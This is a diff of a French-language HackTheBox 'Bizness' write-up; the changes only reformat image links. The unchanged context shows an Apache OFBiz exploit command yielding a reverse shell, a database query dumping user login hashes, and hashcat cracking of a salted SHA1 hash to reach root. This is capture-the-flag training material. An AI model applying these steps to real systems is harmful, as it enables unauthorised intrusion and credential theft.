@@ -20,7 +20,7 @@ seasonal: yes
 
 # Foothold
 
-![[Pasted image 20260318085145.png]]
+![](Pasted%20image%2020260503171038.png)
 
 On arrive sur la page de "Bizness incorporate". Alors évidemment, en descendant suffisamment, on peut lire que le framework est Apache OfBiz.
 
@@ -33,9 +33,9 @@ qui nous donne en sortie que la cible a l'air d'être vulnérable. Et lorsque l'
 python3 exploit.py --url https://bizness.htb --cmd 'id'
 ```
 on nous dit de vérifier la sortie de la commande. Il ne faut pas oublier bien sûr qu'il y a une redirection vers https donc il faut bien utiliser cette origine. Aussi vite que ça on a notre revshell.
-![[Pasted image 20260318095918.png]]
+![](Pasted%20image%2020260503171046.png)
 
-![[Pasted image 20260318095927.png]]
+![](Pasted%20image%2020260503171054.png)
 
 On upgrade notre shell
 
@@ -57,7 +57,7 @@ alias ls='ls $LS_OPTIONS'
 export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
 ```
 
-![[Pasted image 20260318100022.png]]
+![](Pasted%20image%2020260503171102.png)
 
 # Privilege Escalation to root
 
@@ -85,9 +85,9 @@ help;
 show tables;
 select * from OFBIZ.USER_LOGIN;
 ```
-![[Pasted image 20260319101234.png]]
+![](Pasted%20image%2020260503171110.png)
 
-![[Pasted image 20260319101849.png]]
+![](Pasted%20image%2020260503171119.png)
 
 On trouve un mot de passe:
 ```
@@ -171,7 +171,7 @@ echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt
 hashcat -a 0 -m 120 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260319112112.png]]
+![](Pasted%20image%2020260503171125.png)
 
 Et on trouve le mot de passe
 ```
@@ -184,8 +184,8 @@ su root
 ```
 Et ça fonctionne, on a notre root shell!
 
-![[Pasted image 20260319112237.png]]
+![](Pasted%20image%2020260503171130.png)
 
-![[Pasted image 20260319112325.png]]
+![](Pasted%20image%2020260503171135.png)
 
 
